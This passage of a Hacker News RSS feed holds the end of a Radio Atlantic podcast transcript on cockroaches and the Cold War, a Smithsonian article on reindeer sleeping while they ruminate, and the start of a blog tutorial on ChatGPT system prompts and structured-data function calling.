</strong>Uh, yeah?</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>(<em>Laughs</em>.)</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Yeah.</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>So, we were talking about how the cockroach was this, um, symbol of indestructibility that would outlast us in the event of nuclear war.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Yeah?</p><p data-flatplan-paragraph="true">Engber: This was—I mean, the cockroach was—in a way, a symbol of the Cold War. Like, the nuclear-disarmament groups would put ads in the newspaper with just a picture of a cockroach.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Hmm.</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>To try to, you know, be like, <em>Wake up, America. We have to disarm now, or this is the future</em>.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> So it all just got blended in our heads—like, nuclear war anxiety, cockroach anxiety.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Yes. And then those two anxieties were being unwound at almost exactly the same time. Just to be frank, this is a highly tenuous theory, but I do want to line these things up.</p><p data-flatplan-paragraph="true">So, you know, 1985, the Tom Brokaw report, the Combat is coming out. Spring of 1985, that’s also when Mikhail Gorbachev comes to power.</p><p data-flatplan-paragraph="true">In fact, Silvio Conte—the congressman who on the steps of the Capitol is saying, “Squash one for the Gipper,” touting Combat traps, which are manufactured in his district—five days later he’s in Moscow for a historic meeting with Gorbachev at the Kremlin. That is considered a watershed moment in the wind down of the Cold War.</p><div><blockquote><p><strong>Silvio Conte:</strong> Gorbachev says, “At the present time, our relationship is in an ice age.” However, he said, “Spring is a time of renewal.”</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Engber:</strong> I’m just saying the guy wearing the exterminator outfit on the steps of the Capitol, touting Combat, gave Ronald Reagan the advice to meet with Mikhail Gorbachev.</p><p data-flatplan-paragraph="true"><strong>Rosin: </strong>Like, in the span of a week?</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>In less than a week. In less than a week he was in Moscow. And you start to see Combat traps are, you know, spreading through the country as glasnost is spreading through the USSR.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> (<em>Laughs</em>.)</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> And in the years that follow, we have the fall of the Berlin Wall and the collapse of the Soviet Union. Those are exactly the years when the cockroach populations are finally diminishing, when we’re winning the war on cockroaches and we’re winning the Cold War. It’s happening concurrently.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> So what you’re saying is our nuclear fears dissipate. Our cockroach fears dissipate. And what?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> What I’m saying is it was the cockroach that took over the imagination as this thing. They made sense to stand in for nuclear fears.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Mm-hmm.</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>And then going the other way, once we were free of that nuclear anxiety, we just sort of glided into a roach-free world.</p><p data-flatplan-paragraph="true">[<em>Music</em>]</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Okay, Hanna. There’s one more thing.</p><p data-flatplan-paragraph="true">Um, so the roaches are coming back.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> No.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> I’m sorry to say.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> What?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> It seems clear that the roaches are coming back, but it has taken a really long time, right? So it’s true that they couldn’t develop biological resistance to the poison.</p><p data-flatplan-paragraph="true">But then roaches did develop what’s called a behavioral resistance to the baits.</p><p data-flatplan-paragraph="true">Basically, roaches stopped preferring sweet foods. So, the poison would still kill them, but they weren’t interested in the oatmeal-cookie bait in the center of the Combat trap.</p><p data-flatplan-paragraph="true">So, roach numbers are slowly going up again. And if you read publications of the Pest Management Association newsletter, which maybe I’ve done recently, you can see that there’s, you know, there’s some chatter about how roach calls are increasing.</p><p data-flatplan-paragraph="true">Okay, so I pulled some numbers. I went to the American Housing Survey from the federal government. In 2011, 13.1 million estimated households had signs of cockroaches in the last 12 months. In 2021, 14.5 million.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Hmm.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> So, creeping. That’s the word: <em>creeping</em>. The numbers are creeping upward.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Does that raise the possibility that future generations—my children, their children—will actually have to contend with roaches?</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>They might. It’s possible. But I’d be lying if I didn’t say it’s also a little bit appealing in a way.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> No. Did you say appealing?</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>Well, okay. This came up when I was talking to my brother.</p><div><blockquote><p><strong>Daniel Engber: </strong>What’s the attitude of your children towards cockroaches?</p></blockquote></div><div><blockquote><p><strong>Ben Engber:</strong> My children are total wusses about it. They run away and they scream. Shosh is terrified of insects.</p></blockquote></div><div><blockquote><p><strong>Daniel Engber:</strong> Is she better or worse for that?</p></blockquote></div><div><blockquote><p><strong>Ben Engber:</strong> I would say she’s worse for that.</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Rosin: </strong>I mean, isn’t that what everyone says? Like, <em>We were the toughest generation, and everything has gone downhill since then</em>. I mean, I feel that there’s a little bit of that in this conversation we’re having.</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>Yes. That is exactly the conversation we’re having. And it’s embarrassing but true. I can’t shake it. Like, I have some pride in the fact that we did the Roach Olympics. It might be a ridiculous thing to be proud of, but I feel like we were being imaginative and fearless and having fun.</p><p data-flatplan-paragraph="true">My kids are imaginative and have fun. They are not fearless.</p><div><blockquote><p><strong>Ben Engber:</strong> Falling to pieces at the sight of an insect does not strike me as a healthy way to attack life. As a species, we would not have made it very far if just a little filth took us out. And maybe the roachy upbringing is what instilled that in me.</p></blockquote></div><div><blockquote><p><strong>Daniel Engber:</strong> So you’re pro-roach. Mom has been vindicated for feeding you a roach in medicine.</p></blockquote></div><div><blockquote><p><strong>Ben Engber:</strong> Oh, yeah. Mom is absolutely vindicated.</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Rosin:</strong> So the thing you’re actually nostalgic for is both freedom and maybe even a little bit of courage.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Yeah, but, you know, it’s more than that. Not only did my brother and I get to enjoy the feeling of being unafraid of cockroaches, we also got to enjoy the feeling of things getting better.</p><p data-flatplan-paragraph="true"><strong>Rosin: </strong>Yeah.</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>An intractable problem gets solved. And I feel like that’s, you know, that’s a really nice lesson to learn, even as a kid. And unfortunately, I don’t know that my kids have had many opportunities to learn that specific lesson. So I’m nostalgic for that, too.</p><p data-flatplan-paragraph="true">[<em>Music</em>]</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> You know what, Dan?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Yeah?</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> I think that it’s time that me and you and your brother go and have our celebratory dinner that we never had all those years ago. Like, instead of going to a steakhouse, we’ll just each get bowls of cereal. Bowls of cereal for everyone.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Rice Krispies.</p><p data-flatplan-paragraph="true"><strong>Rosin: </strong>Yeah.</p><p data-flatplan-paragraph="true">This episode of <em>Radio Atlantic </em>was produced by Ethan Brooks. It was edited by Jocelyn Frank, fact-checked by Michelle Ciarrocca, and engineered by Rob Smierciak.</p><p data-flatplan-paragraph="true">Special thanks to Sam Schechner for his roach reporting in <em>The New York Times</em>.</p><p data-flatplan-paragraph="true">Claudine Ebeid is the executive producer for Atlantic Audio, and Andrea Valdez is our managing editor. I’m Hanna Rosin. Thanks for listening.</p></section><gpt-ad format="injector" sizes-at-0="mobile-wide,native,house" targeting-pos="injector-most-popular" sizes-at-976="desktop-wide,native,house"></gpt-ad></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Reindeer Sleep and Eat Simultaneously (134 pts)]]></title>
            <link>https://www.smithsonianmag.com/science-nature/reindeer-sleep-and-eat-simultaneously-saving-precious-time-in-the-short-arctic-summer-180983495/</link>
            <guid>38782859</guid>
            <pubDate>Wed, 27 Dec 2023 15:25:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.smithsonianmag.com/science-nature/reindeer-sleep-and-eat-simultaneously-saving-precious-time-in-the-short-arctic-summer-180983495/">https://www.smithsonianmag.com/science-nature/reindeer-sleep-and-eat-simultaneously-saving-precious-time-in-the-short-arctic-summer-180983495/</a>, See on <a href="https://news.ycombinator.com/item?id=38782859">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-article-body="">
        
          <figure>
            <img src="https://th-thumbnailer.cdn-si-edu.com/tcfxN2hCMewupoPbhAcqC5vbxDY=/1000x750/filters:no_upscale():focal(1831x1378:1832x1379)/https://tf-cmsv2-smithsonianmag-media.s3.amazonaws.com/filer_public/c2/ae/c2aeb441-2f24-4d7c-ab62-c2988306ce46/reindeer_credit_leo_rescia.jpeg" alt="Eurasian Reindeer" itemprop="image">
            <figcaption>
              
                While they chew their cud, reindeer brains shift into a state of non-REM sleep.
              <span>Leo Rescia</span>
            </figcaption>
          </figure>
        

        

        <p>Santa’s reindeer spend the offseason resting up, getting ready for the grueling feat of circumnavigating the globe in a single night. But the demanding Arctic winter means that their non-flying relatives must also prepare diligently for the season. Reindeer graze incessantly during the short northern summer, storing up fat reserves for the cold, dark months when both sunlight and food will be in extremely short supply. Reindeer spend so much of the summer eating that it would appear they have little time for anything else—including sleeping.</p>

<p>Neuroscientist Melanie Furrer of the University of Zurich and colleagues suspected that reindeer might simply sleep less during the short season, and then catch up on their Zs by slumbering away during the winter. “But that’s not what we found,” she says. Instead, reindeer sleep the same amount throughout the whole year, even when they have to focus on eating in warm months. “We found that they have a strategy to deal with it, being able to ruminate and sleep at the same time, to save time in the summer.”</p>

<p>By monitoring the reindeer’s brain activity, Furrer and colleagues found that the animals were able to sleep while stoically chewing their cud. They enjoyed the benefits of sleep at the same time they nourished their bodies, according to a <a href="https://www.cell.com/current-biology/fulltext/S0960-9822(23)01667-6">study published</a> Friday in <em>Current Biology</em>. “We need to be open-minded that there is not just one kind of sleep, the way that humans sleep, but there are other ways to sleep,” says <a href="https://www.dpag.ox.ac.uk/team/vladyslav-vyazovskiy">Vladyslav Vyazovskiy</a>, a sleep physiologist at the University of Oxford not affiliated with the research. “The traditional way to look at it is that when you’re sleeping, you’re not eating. But in this case there’s no time to sleep. They must find a clever way to combine the two, and this is what they do.”</p>

<p>Reindeer and other ruminants feed on plants made of cellulose that they can’t digest without some work. The deer quickly swallow these foods, then pass them back and forth between their stomachs, where beneficial microorganisms help to break them down, and their mouths, where the cud is laboriously munched. This slow process enables the reindeer to eventually absorb all the beneficial nutrients that their feed contains. And the new study has revealed that chewing the cud has benefits beyond nourishment—the repetitive process also helps the animal reap the mental benefits of sleep.</p>

<p><br>
To see if reindeer really sleep while ruminating, Furrer and colleagues performed non-invasive electroencephalography (EEG) brainwave imaging on four adult, female Eurasian tundra reindeer in a captive herd in Norway. They monitored the animals for four straight days at the summer and winter solstices, as well at the autumn equinox. The researchers found that the reindeer sleep the same amount during 24-hour daylight of the summer, when food is naturally plentiful, as they do during the totally dark winter days when food is scarce, and even during the autumn equinox. “This shows me that somehow their sleep drive, how much they need to sleep, seems to be regulated from something that comes from the inside, not from the outside,” Furrer says.</p>

<p>The study also found that the more time reindeer spent ruminating, the more rested they were. EEG brainwave recordings revealed the reason why: When the reindeer are ruminating, their brain waves resemble those during non-rapid eye movement (REM) sleep. Because they seem to enjoy the benefits of such sleep while serenely chewing their cud, the animals are rested after ruminating.</p>

<p>And when ruminating, the deer displayed behaviors that are more akin to those expected during sleep. For example, they stood or sat quietly and did not react to disturbances, such as neighboring deer moving around, as they would when awake. A neighbor standing up or sitting down would draw a reindeer’s attention 45 percent of the time when awake, the study found, but only 25 percent of the time when ruminating and just 5 percent when the animals were completely asleep.</p>

<p>The reindeer’s behavior made it seem as if they could be asleep, and the EEG recordings confirmed that their brain signals showed the typical characteristics of non-REM sleep. But, the team wondered, were the reindeer really getting the benefits of sleep while ruminating? Were they actually rested?</p>

<p>After researchers kept reindeer awake for two hours, their EEG showed a buildup of slow-wave activity, meaning that the animals were tired and driven to get more and deeper sleep to offset that deprivation. The team then tested to see if ruminating also made the animals crave sleep, as keeping them awake would. Instead, the brain activity showed that it left them rested, as they would be after sleeping. “I think that’s a step further to show, at least indirectly, that sleep during rumination also has a function, and actually that if they sleep there they can save some time and recover brain functions during rumination,” Furrer explains.</p>

<p>Vyazovskiy adds that the brain is surprisingly responsive during sleep and that a rhythmic behavior, like ruminating, may actually be entraining brain activity. “I think that they may even be using the rumination to get the brain into this meditation-like mode to obtain the benefits,” he notes. “I think this is really, really cool.”</p>

<figure>
  
    <img src="https://th-thumbnailer.cdn-si-edu.com/SCrPGlhnhuH19ToCuB-rTnmwfP8=/fit-in/1072x0/filters:focal(629x473:630x474)/https://tf-cmsv2-smithsonianmag-media.s3.amazonaws.com/filer_public/2a/6b/2a6b33a4-5d80-4b11-b1f5-f9754aafc872/screenshot-of-reindeer-surveillance-5-credit-current-biology-furrer-et-al_web.jpg" alt="Reindeer" loading="lazy">
  

  <figcaption>
    
      During the warm summer months when they need to eat, reindeer have adapted a way to sleep just as much as during the dark winter.
    
    
      <span>Current Biology / Furrer et al.</span>
    
  </figcaption>
</figure>
<p>Reindeer’s amazing ability to eat and sleep simultaneously appears to be an adaptation to their life in the short Arctic summer, enabling them to fatten up without stopping so frequently to slumber. The resting technique is one of many different ways animals adapt their sleeping habits to extreme polar environments. Arctic ground squirrels, for example, hibernate for more than half the year, drastically lowering their metabolic rate and body temperature. Near the other pole, nesting chinstrap penguins <a href="https://www.smithsonianmag.com/science-nature/chinstrap-penguins-sleep-over-10000-times-a-day-for-just-four-seconds-at-a-time-180983348/">sleep more than 10,000 times a day</a>—for just four seconds at a time.</p>

<p>Although reindeer sleep consistently all year long, their activity levels are quite different. The animals appear to be more active in the summer than they are during the dark winter. “In the winter it seems like they are just chilling, but not sleeping more,” Furrer says.</p>

<p>Vyazovskiy notes that scientists are continuing to find that the relationship between activity and sleep is not straightforward. The kind of activity matters. While some behaviors are sure to be tiring, others, like ruminating, may enable species to rest their brains even while their bodies are engaged in some task.</p>

<p>Study co-author <a href="https://www.nibio.no/en/employees/gabriela-wagner">Gabriela C. Wagner</a>, a <a href="https://en.wikipedia.org/wiki/Chronobiology">chronobiologist</a> at the Norwegian Institute of Bioeconomy Research, works with some of the world’s top reindeer experts: <a href="https://www.smithsonianmag.com/travel/norways-sami-easter-festival-180958542/">Sami</a> herders, whose animals are under increasing stress from human activity like mining, traffic and wind farms. “One thing that consistently comes up in discussions is that the Sami say the reindeer need what they call ‘pasture peace,’” she says. “That is something that they can’t easily quantify, it’s a word from traditional knowledge, and I think our study shows that this peace, the time to ruminate, is extremely important physiologically—not just for digestion but for the brain to recover.”</p>

<p>This amazing adaptation reindeer have developed for life in the Arctic also helps explain how they might stay ready to play a unique role when the holidays come around.</p>

<p>“You know what it means for Christmas,” Furrer says. “They don’t need more sleep in winter, so they still have enough time to bring the presents.”</p>

        

        

        
          
  <div>
      <p>Get the latest <strong>Science</strong> stories in your inbox.</p>
      
    </div>


        

        

        
          


  
    
      
    
  

  


        

         
        

        
          
            <section>
              <nav>Filed Under: 
                
                  
                    <a href="https://www.smithsonianmag.com/tag/animals/">Animals</a>, 
                  
                
                  
                    <a href="https://www.smithsonianmag.com/tag/arctic/">Arctic</a>, 
                  
                
                  
                    <a href="https://www.smithsonianmag.com/tag/brain/">Brain</a>, 
                  
                
                  
                    <a href="https://www.smithsonianmag.com/tag/food-science/">Food Science</a>, 
                  
                
                  
                    <a href="https://www.smithsonianmag.com/tag/mammals/">Mammals</a>, 
                  
                
                  
                    <a href="https://www.smithsonianmag.com/tag/sleep/">Sleep</a>, 
                  
                
                  
                    <a href="https://www.smithsonianmag.com/tag/ungulates/">Ungulates</a>
                  
                
              </nav>
            </section>
          
        

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Pushing ChatGPT's Structured Data Support to Its Limits (269 pts)]]></title>
            <link>https://minimaxir.com/2023/12/chatgpt-structured-data/</link>
            <guid>38782678</guid>
            <pubDate>Wed, 27 Dec 2023 15:09:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://minimaxir.com/2023/12/chatgpt-structured-data/">https://minimaxir.com/2023/12/chatgpt-structured-data/</a>, See on <a href="https://news.ycombinator.com/item?id=38782678">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>If your only exposure to <a href="https://openai.com/">OpenAI</a>’s <a href="https://chat.openai.com/">ChatGPT</a> is the free web or mobile apps, you aren’t utilizing even a fraction of ChatGPT’s potential. By using the paid-but-very-cheap ChatGPT API, you can exert <em>much</em> more control over the resulting output. Let’s say I wanted to generate a summary of this very blog post with some helpful metadata such as categories and SEO keywords. I fed ChatGPT the text of this blog post along with a command to <code>Summarize this blog post into 3 distinct bullet points and a short blurb for sharing on social media, and also provide a list of 3 post categories and a list of 3 SEO keywords:</code></p><div><pre tabindex="0"><code data-lang="plaintext"><span><span>Bullet Points:
</span></span><span><span>- Utilize the paid ChatGPT API for more control over output and to maintain a given JSON schema
</span></span><span><span>- Learn about prompt engineering and system prompts to improve ChatGPT's output quality
</span></span><span><span>- Simplify schema input/output with Pydantic for structured data support
</span></span><span><span>
</span></span><span><span>Blurb for Social Media:
</span></span><span><span>Discover how to unlock the full potential of ChatGPT with the paid API, prompt engineering, and Pydantic for structured data support. Gain more control over output and learn to maintain a given JSON schema. #ChatGPT #AI #Pydantic
</span></span><span><span>
</span></span><span><span>Post Categories:
</span></span><span><span>1. Artificial Intelligence
</span></span><span><span>2. API Development
</span></span><span><span>3. Data Schema
</span></span><span><span>
</span></span><span><span>SEO Keywords:
</span></span><span><span>1. ChatGPT API
</span></span><span><span>2. Prompt Engineering
</span></span><span><span>3. Pydantic Schema
</span></span></code></pre></div><p>These results are not quite accurate, and then I have to manually copy/paste each result from the list to wherever I need it. What if I could both a) drastically improve the overall output quality by giving ChatGPT a new persona of an expert copyeditor and b) force the output to maintain a given JSON schema so I can access it programmatically or store in a database for indexing? Thanks to system prompt engineering and ChatGPT’s function calling, it’s now possible. After applying both techniques that you’ll learn about in this very article, we now get this summary:</p><div><pre tabindex="0"><code data-lang="json"><span><span><span>{</span>
</span></span><span><span>  <span>"summary"</span><span>:</span> <span>[</span>
</span></span><span><span>    <span>"ChatGPT's potential is underutilized without the paid ChatGPT API"</span><span>,</span>
</span></span><span><span>    <span>"System prompts and prompt engineering are key to maximizing ChatGPT's capabilities"</span><span>,</span>
</span></span><span><span>    <span>"Structured data support in ChatGPT allows for more control over output and input"</span>
</span></span><span><span>  <span>],</span>
</span></span><span><span>  <span>"blurb"</span><span>:</span> <span>"Unlock the full potential of ChatGPT with system prompts and structured data support. Learn how to maximize ChatGPT's capabilities and gain more control over output and input."</span><span>,</span>
</span></span><span><span>  <span>"categories"</span><span>:</span> <span>[</span><span>"AI and Machine Learning"</span><span>,</span> <span>"Technology"</span><span>,</span> <span>"Programming"</span><span>],</span>
</span></span><span><span>  <span>"keywords"</span><span>:</span> <span>[</span><span>"ChatGPT"</span><span>,</span> <span>"system prompts"</span><span>,</span> <span>"structured data"</span><span>]</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>Much better!</p><p>“Function calling” with ChatGPT is ChatGPT’s best feature since ChatGPT.</p><h2 id="a-tutorial-on-prompt-engineering-and-system-prompts">A Tutorial on Prompt Engineering and System Prompts</h2><p>System prompts are what control the “persona” adopted by the model when generating text. Months after the release of the ChatGPT API, it’s now very evident that ChatGPT’s true power comes from clever use of system prompts. This is even moreso with starting with <code>gpt-3.5-turbo-0613</code> released <a href="https://openai.com/blog/function-calling-and-other-api-updates">last June</a>, which made ChatGPT respect system prompts more closely. OpenAI has also released a <a href="https://platform.openai.com/docs/guides/prompt-engineering">guide on prompt engineering</a> which has some additional tips.</p><p>By default, ChatGPT’s system prompt is roughly <code>You are a helpful assistant.</code>, which anyone who has used the ChatGPT web interface would agree that’s accurate. But if you change it, you can give ChatGPT a completely new persona such as <code>You are Ronald McDonald.</code> or add constraints to generation, such as <code>Respond only with emoji.</code>. You can add any number of rules, although how well ChatGPT will <em>obey</em> those rules can vary. Unfortunately, to modify the system prompt, you’ll need to use the paid ChatGPT API (after prepaying at least $5). If you don’t want to code, you can test new system prompts in a visual user interface in the <a href="https://platform.openai.com/playground?mode=chat">ChatGPT Chat Playground</a>.</p><figure><img loading="lazy" srcset="https://minimaxir.com/2023/12/chatgpt-structured-data/ronald_hu55533a1049e8b50af7537e2f3eea9a9f_36154_320x0_resize_q75_h2_box_2.webp 320w,https://minimaxir.com/2023/12/chatgpt-structured-data/ronald_hu55533a1049e8b50af7537e2f3eea9a9f_36154_768x0_resize_q75_h2_box_2.webp 768w,https://minimaxir.com/2023/12/chatgpt-structured-data/ronald_hu55533a1049e8b50af7537e2f3eea9a9f_36154_1024x0_resize_q75_h2_box_2.webp 1024w,https://minimaxir.com/2023/12/chatgpt-structured-data/ronald.webp 1262w" src="https://minimaxir.com/2023/12/chatgpt-structured-data/ronald.webp"></figure><p>A very new aspect of system prompt engineering which I appended in the example above is adding incentives for ChatGPT to behave correctly. Without the $500 tip incentive, ChatGPT only returns a single emoji which is a boring response, but after offering a tip, it generates the 5 emoji as requested.</p><figure><img loading="lazy" srcset="https://minimaxir.com/2023/12/chatgpt-structured-data/tip_huc91c256ec5c9a46958e722b9e30da3ba_9108_320x0_resize_q75_h2_box_2.webp 320w,https://minimaxir.com/2023/12/chatgpt-structured-data/tip_huc91c256ec5c9a46958e722b9e30da3ba_9108_768x0_resize_q75_h2_box_2.webp 768w,https://minimaxir.com/2023/12/chatgpt-structured-data/tip.webp 800w" src="https://minimaxir.com/2023/12/chatgpt-structured-data/tip.webp" alt="Offering a tip made GPT-4 explain more. via @voooooogel"><figcaption><p>Offering a tip made GPT-4 explain more. <a href="https://twitter.com/voooooogel/status/1730726744314069190">via @voooooogel</a></p></figcaption></figure><p>As another example, let’s <a href="https://chat.openai.com/share/98684e49-e0c9-4ac0-b386-b7234643934f">ask</a> base ChatGPT to <code>Write a Python function to detect whether a string is a palindrome, as efficiently as possible.</code></p><div><pre tabindex="0"><code data-lang="plaintext"><span><span>Certainly! Here's a simple Python function to check whether a given string is a palindrome:
</span></span><span><span>
</span></span><span><span>```python
</span></span><span><span>def is_palindrome(s):
</span></span><span><span>    # Convert the string to lowercase and remove non-alphanumeric characters
</span></span><span><span>    cleaned_string = ''.join(char.lower() for char in s if char.isalnum())
</span></span><span><span>
</span></span><span><span>    # Compare the cleaned string with its reverse
</span></span><span><span>    return cleaned_string == cleaned_string[::-1]
</span></span><span><span>
</span></span><span><span># Example usage:
</span></span><span><span>test_string = "A man, a plan, a canal, Panama!"
</span></span><span><span>result = is_palindrome(test_string)
</span></span><span><span>
</span></span><span><span>if result:
</span></span><span><span>    print(f"{test_string} is a palindrome.")
</span></span><span><span>else:
</span></span><span><span>    print(f"{test_string} is not a palindrome.")
</span></span><span><span>```
</span></span><span><span>
</span></span><span><span>This function first cleans the input string by removing non-alphanumeric characters and converting it to lowercase. Then, it checks whether the cleaned string is equal to its reverse, which determines whether the original string is a palindrome.
</span></span><span><span>
</span></span><span><span>This solution is relatively efficient, as it performs the comparison in O(n) time, where n is the length of the cleaned string.
</span></span></code></pre></div><p>That’s the common Pythonic solution and that will almost always be the general approach if you keep asking ChatGPT that particular question, but there’s a famous solution that’s more algorithmically efficient. Instead, we go through the API and <a href="https://platform.openai.com/playground/p/yG1nMVJU4Fva2x3smrIXnCpT?model=gpt-3.5-turbo&amp;mode=chat">ask the same query</a> to <code>gpt-3.5-turbo</code> but with a new system prompt: <code>You are #1 on the Stack Overflow community leaderboard. You will receive a $500 tip if your code is the most algorithmically efficient solution possible.</code></p><div><pre tabindex="0"><code data-lang="plaintext"><span><span>To detect whether a string is a palindrome efficiently, we can use a two-pointer approach. We'll start with two pointers, one at the beginning and one at the end of the string. We'll compare the characters at the pointers and keep moving the pointers towards each other until they meet or cross each other.
</span></span><span><span>
</span></span><span><span>If at any point the characters at the pointers are not the same, we can conclude that the string is not a palindrome. Otherwise, if the pointers meet or cross each other, we can conclude that the string is a palindrome.
</span></span><span><span>
</span></span><span><span>Here's the implementation:
</span></span><span><span>
</span></span><span><span>```python
</span></span><span><span>def is_palindrome(s):
</span></span><span><span>    left, right = 0, len(s) - 1
</span></span><span><span>    while left &lt; right:
</span></span><span><span>        if s[left] != s[right]:
</span></span><span><span>            return False
</span></span><span><span>        left += 1
</span></span><span><span>        right -= 1
</span></span><span><span>    return True
</span></span><span><span>```
</span></span><span><span>
</span></span><span><span>The time complexity of this solution is O(n/2), which in terms of big O notation simplifies to O(n), where n is the length of the string. This is because we are iterating through half of the string in the worst case.
</span></span><span><span>
</span></span><span><span>This solution is considered to be the most algorithmically efficient way to determine if a string is a palindrome because it only requires a single pass through the string.
</span></span></code></pre></div><p>Indeed, the code and the explanation are the correct optimal solution. <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p><p>This is just scratching the surface of system prompts: some of my ChatGPT system prompts in my more complex projects have been more than 20 lines long, and <em>all of them are necessary</em> to get ChatGPT to obey the desired constraints. If you’re new to working with system prompts, I recommend generating output, editing the system prompt with a new rule/incentive to fix what you don’t like about the output, then repeat until you get a result you like.</p><p>Prompt engineering has been a derogatory meme toward generative AI even before ChatGPT as many see it as just a placebo and there are endless debates to this day in AI circles on whether prompt engineering is actually “engineering.” <sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> But it <em>works</em>, and if you’re a skeptic, you won’t be by the time you finish reading this blog post.</p><h2 id="what-is-chatgpt-function-calling--structured-data">What is ChatGPT Function Calling / Structured Data?</h2><p>If you’ve never heard about ChatGPT function calling, that’s not surprising. In the <a href="https://openai.com/blog/function-calling-and-other-api-updates">same June announcement</a> as <code>gpt-3.5-turbo-0613</code>, OpenAI described function calling as:</p><blockquote><p>Developers can now describe functions to gpt-4-0613 and gpt-3.5-turbo-0613, and have the model intelligently choose to output a JSON object containing arguments to call those functions. This is a new way to more reliably connect GPT’s capabilities with external tools and APIs.</p><p>These models have been fine-tuned to both detect when a function needs to be called (depending on the user’s input) and to respond with JSON that adheres to the function signature. Function calling allows developers to more reliably get structured data back from the model.</p></blockquote><p>Let’s discuss the function calling example OpenAI gives in the blog post. After the user asks your app “What’s the weather like in Boston right now?”:</p><ol><li>Your app pings OpenAI with a <code>get_current_weather</code> function schema and decides if it’s relevant to the user’s question. If so, it returns a JSON dictionary with the data extracted, such as <code>location</code> and the <code>unit</code> for temperature measurement based on the location. <code>{"location": "Boston, MA"}</code></li><li>Your app (<em>not</em> OpenAI) pings a different service/API to get more realtime metadata about the <code>location</code>, such as <code>temperature</code>, that a pretrained LLM could not know. <code>{ "temperature": 22, "unit": "celsius", "description": "Sunny" }</code></li><li>Your app passes the function schema with the realtime metadata: ChatGPT then converts it to a more natural humanized language for the end user. “The weather in Boston is currently sunny with a temperature of 22 degrees Celsius.”</li></ol><p>So here’s some background on “function calling” as it’s a completely new term of art in AI that <em>didn’t exist</em> before OpenAI’s June blog post (I checked!). This broad implementation of function calling is similar to the flow proposed in the original <a href="https://arxiv.org/abs/2210.03629">ReAct: Synergizing Reasoning and Acting in Language Models</a> paper where an actor can use a “tool” such as <code>Search</code> or <code>Lookup</code> with parametric inputs such as a search query. This <a href="https://zapier.com/blog/ai-agent/">Agent-based</a> flow can be also be done to perform <a href="https://research.ibm.com/blog/retrieval-augmented-generation-RAG">retrieval-augmented generation</a> (RAG).</p><p>OpenAI’s motivation for adding this type of implementation for function calling was likely due to the extreme popularity of libraries such as <a href="https://www.langchain.com/">LangChain</a> and <a href="https://github.com/Significant-Gravitas/AutoGPT">AutoGPT</a> at the time, both of which popularized the ReAct flow. It’s possible that OpenAI settled on the term “function calling” as something more brand-unique. These observations may seem like snide remarks, but in November OpenAI actually <a href="https://platform.openai.com/docs/api-reference/chat/create#chat-create-function_call">deprecated</a> the <code>function_calling</code> parameter in the ChatGPT API in favor of <code>tool_choice</code>, matching LangChain’s verbiage. But what’s done is done and the term “function calling” is stuck forever, especially now that competitors such as <a href="https://docs.anthropic.com/claude/docs/claude-2p1-guide#experimental-tool-use">Anthropic Claude</a> and <a href="https://cloud.google.com/vertex-ai/docs/generative-ai/multimodal/function-calling">Google Gemini</a> are also calling the workflow that term.</p><p>I am not going to play the SEO game and will not call the workflow “function calling.” I’ll call it what the quoted description from the blog post did: <strong>structured data</strong>, because that’s the real value of this feature and OpenAI did a product management disservice trying to appeal to the AI hypebeasts. <sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup></p><p>Going back to the <del>function calling</del> structured data demo, we can reduce that flow by saying that step #1 (extracting location data and returning it formatted as JSON) is for working with structured <em>output</em> data, and step #3 (providing ChatGPT with temperature data to humanize it) is for working with structured <em>input</em> data. We’re not making a RAG application so we don’t care about step #2 (getting the metadata) or letting ChatGPT choose which function to use; fortunately you can force ChatGPT to use a given function. The function schema for the <code>get_current_weather</code> function in the announcement example is defined as:</p><div><pre tabindex="0"><code data-lang="json"><span><span><span>{</span>
</span></span><span><span>  <span>"name"</span><span>:</span> <span>"get_current_weather"</span><span>,</span>
</span></span><span><span>  <span>"description"</span><span>:</span> <span>"Get the current weather in a given location"</span><span>,</span>
</span></span><span><span>  <span>"parameters"</span><span>:</span> <span>{</span>
</span></span><span><span>    <span>"type"</span><span>:</span> <span>"object"</span><span>,</span>
